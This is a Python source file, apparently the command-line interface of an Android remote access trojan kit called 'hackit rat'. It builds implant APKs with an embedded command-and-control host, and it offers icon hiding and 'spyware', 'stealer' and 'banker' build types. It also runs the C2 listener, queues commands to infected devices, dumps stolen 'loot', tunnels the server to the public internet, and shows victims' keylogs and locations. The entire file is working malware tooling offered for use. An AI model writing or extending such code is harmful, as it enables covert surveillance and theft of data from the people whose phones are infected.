"""hackit rat — Android implant, encrypted C2 and operator console.

``hackit rat doctor``       toolchain readiness
``hackit rat keygen``       mint a PSK + a build config
``hackit rat build``        bake host/psk into an APK
``hackit rat serve``        headless C2 listener
``hackit rat console``      C2 listener + interactive operator shell
"""
from __future__ import annotations

import base64
import json
import os
import secrets

import click

from hackit.ui import _colored, B_GREEN, DIM, GREEN, RED

from . import builder, console, menu, protocol, server, store, ui

HOME = store.ROOT
PSK_PATH = os.path.join(HOME, "psk.txt")


def _psk_b64(path: str) -> str:
    key = server.load_psk(path) if os.path.exists(path) else server.write_psk(path)
    return base64.b64encode(key).decode("ascii")


@click.group(invoke_without_command=True)
@click.pass_context
def rat(ctx):
    """Android RAT bench — build implant, run C2, drive sessions."""
    if ctx.invoked_subcommand is None:
        menu.interactive()


@rat.command()
def doctor():
    """Check JDK / SDK / build-tools readiness without building."""
    rc = builder.doctor()
    raise SystemExit(rc)


@rat.command()
@click.option("--host", required=True, help="C2 base URL the implant calls, e.g. https://c2.example.com")
@click.option("--label", default="android", help="implant label shown in the session list")
@click.option("--interval", default=60000, show_default=True, help="beacon interval in ms (min 15000)")
@click.option("--hide-icon", is_flag=True, help="disable the launcher alias at first run")
@click.option("--pin", default="", help="optional TLS cert SHA-256 pin")
@click.option("--spec", default="rat", help="rat/trojan/spyware/malware/stealer/banker/bot/minimal")
@click.option("--out", default=os.path.join(HOME, "agent.json"), help="config path to write")
def keygen(host, label, interval, hide_icon, pin, spec, out):
    """Mint a PSK and write a build config for this C2."""
    key_b64 = _psk_b64(PSK_PATH)
    config = builder.make_config(host, key_b64, label, interval, hide_icon, pin, spec)
    os.makedirs(os.path.dirname(out) or ".", exist_ok=True)
    with open(out, "w", encoding="utf-8") as handle:
        json.dump(config, handle, indent=2)
    os.chmod(out, 0o600)
    click.echo(_colored(f"  psk     {PSK_PATH}", DIM))
    click.echo(_colored(f"  config  {out}", B_GREEN))
    click.echo(f"  host    {config['host']}   interval {config['interval']}ms")


@rat.command()
@click.option("--config", "config_path", default=os.path.join(HOME, "agent.json"), show_default=True)
@click.option("--engine", type=click.Choice(["auto", "sdk", "gradle"]), default="auto", show_default=True)
@click.option("--debug", is_flag=True, help="unminified debug build (gradle engine only)")
@click.option("--out", default="", help="copy the finished apk here")
def build(config_path, engine, debug, out):
    """Compile the implant into a signed APK."""
    if not os.path.exists(config_path):
        raise SystemExit(_colored(f"  config not found: {config_path} (run keygen)", RED))
    with open(config_path, "r", encoding="utf-8") as handle:
        config = json.load(handle)
    try:
        builder.build(config, engine=engine, release=not debug, out=out or None)
    except builder.BuildError as exc:
        raise SystemExit(_colored(f"  build failed: {exc}", RED))
    click.echo(_colored("  install:  adb install -r <apk>", DIM))
    click.echo(_colored("  open once: adb shell am start -n %s/.MainActivity" % config.get("package", "com.hackit.agent"), DIM))


@rat.command()
@click.option("--host", default="0.0.0.0", show_default=True)
@click.option("--port", default=8443, show_default=True, type=int)
@click.option("--udp", "udp_port", default=None, type=int, help="native UDP port (default http port + 100)")
@click.option("--public-url", default="", help="URL printed in the dashboard (default http://127.0.0.1:port)")
@click.option("--psk", "psk_path", default=PSK_PATH, show_default=True)
@click.option("--token", default=None, help="operator token (generated when omitted)")
def serve(host, port, udp_port, public_url, psk_path, token):
    """Run the C2 listener headless."""
    store.init()
    url = public_url or f"http://127.0.0.1:{port}"
    if not os.path.exists(psk_path):
        server.write_psk(psk_path)
        click.echo(_colored(f"  minted {psk_path}", DIM))
    try:
        server.run(host, port, psk_path, token, url, udp_port or port + 100)
    except KeyboardInterrupt:
        click.echo(_colored("\n  stopped", DIM))


@rat.command()
@click.option("--host", default="0.0.0.0", show_default=True)
@click.option("--port", default=8443, show_default=True, type=int)
@click.option("--udp", "udp_port", default=None, type=int, help="native UDP port (default http port + 100)")
@click.option("--public-url", default="", help="URL baked into new builds")
@click.option("--psk", "psk_path", default=PSK_PATH, show_default=True)
def control(host, port, udp_port, public_url, psk_path):
    """Listener + interactive operator console in one process."""
    store.init()
    if not os.path.exists(psk_path):
        server.write_psk(psk_path)
    key = server.load_psk(psk_path)
    console.run(host, port, key, public_url or f"http://127.0.0.1:{port}", udp_port or port + 100)


@rat.command()
def setup() -> None:
    """Install JDK, Android SDK, build-tools, NDK, CMake — sekali saja."""
    import shutil, subprocess, sys
    home = os.path.expanduser("~")
    sdk = os.path.join(home, "Android", "Sdk")
    print(f"  sdk root   {sdk}")
    print("  pastikan java sudah terpasang: sudo apt-get install -y default-jdk-headless")
    print("  atau lakukan manual:")
    print(f"    mkdir -p {sdk}/cmdline-tools")
    print(f"    cd {sdk}/cmdline-tools")
    print(f"    curl -sSL -o c.zip https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip")
    print(f"    unzip -q c.zip -d cmdline-tools && mv cmdline-tools/cmdline-tools cmdline-tools/latest && rm c.zip")
    print(f"    export ANDROID_HOME={sdk}")
    print(f"    yes | {sdk}/cmdline-tools/latest/bin/sdkmanager --licenses")
    print(f'    {sdk}/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-35" "build-tools;35.0.0" "ndk;27.2.12479018"')
    print("")
    # cek sekarang
    found = 0
    for key in ("ANDROID_HOME", "ANDROID_SDK_ROOT"):
        v = os.environ.get(key)
        if v and os.path.isdir(v):
            print(f"  {key}  {v}   OK"); found += 1
    if found == 0:
        print("  [i] belum ada ANDROID_HOME di environment; isi dulu baru build jalan")
    # cek java
    if shutil.which("java"):
        print("  java       OK")
    else:
        print("  java       BELUM — sudo apt-get install -y default-jdk-headless")
    if shutil.which("gradle"):
        print("  gradle     OK (opsional)")
    else:
        print("  gradle     BELUM (opsional, sdk engine akan dipakai)")


@rat.command()
def sessions():
    """Print known sessions (headless view)."""
    store.init()
    rows = store.sessions()
    if not rows:
        click.echo(_colored("  no sessions", DIM))
        return
    for row in rows:
        state = _colored("online", GREEN) if row["online"] else _colored("offline", DIM)
        click.echo(f"  {row['sid']}  {row['label']}  {row.get('model') or '?'}  {state}")


@rat.command()
@click.argument("sid")
@click.argument("command", type=click.Choice(list(protocol.COMMANDS)))
@click.argument("args", nargs=-1)
def send(sid, command, args):
    """Queue one command against a session and print its id."""
    store.init()
    if not store.get_session(sid):
        raise SystemExit(_colored("  unknown session", RED))
    task_id = store.queue_task(sid, command, list(args))
    click.echo(str(task_id))


@rat.command()
@click.option("--sid", default="", help="limit to one session")
def dump(sid):
    """Dump the local database as JSON (sessions, events, tasks, loot)."""
    store.init()
    payload = {
        "sessions": [s for s in store.sessions() if not sid or s["sid"] == sid],
        "loot": [l for s in store.sessions() if not sid or s["sid"] == sid for l in store.loot(s["sid"])],
    }
    click.echo(json.dumps(payload, indent=2))


@rat.command()
@click.option("--label", default="token", show_default=True)
def mint(label):
    """Mint a standalone random PSK (base64) without writing the key file."""
    key = base64.b64encode(secrets.token_bytes(32)).decode("ascii")
    click.echo(json.dumps({label: key}))


@rat.command()
@click.option("--port", default=8443, show_default=True, type=int)
@click.option("--provider", default="auto", type=click.Choice(["auto", "cloudflared", "ngrok", "ssh"]))
def tunnel(port, provider):
    """Expose the C2 on a public URL (needs cloudflared/ngrok/ssh)."""
    from . import tunnel as tun

    if tun.start(port, provider) is None:
        raise SystemExit(_colored("  no tunnel binary — see hackit rat doctor output", RED))


rat.add_command(control, name="console")
rat.add_command(control, name="control")


@rat.command()
@click.option("--host", default="0.0.0.0", show_default=True)
@click.option("--port", default=8443, show_default=True, type=int)
@click.option("--udp", "udp_port", default=None, type=int, help="native UDP port (default http port + 100)")
@click.option("--public-url", default="", help="URL shown in the UI header")
@click.option("--psk", "psk_path", default=PSK_PATH, show_default=True)
def run(host, port, udp_port, public_url, psk_path):
    """Live operator UI: sessions, feed, keylog and location."""
    store.init()
    key = server.load_psk(psk_path) if os.path.exists(psk_path) else server.write_psk(psk_path)
    ui.run(host, port, key, public_url or f"http://127.0.0.1:{port}", udp_port or port + 100)

__all__ = ["rat"]
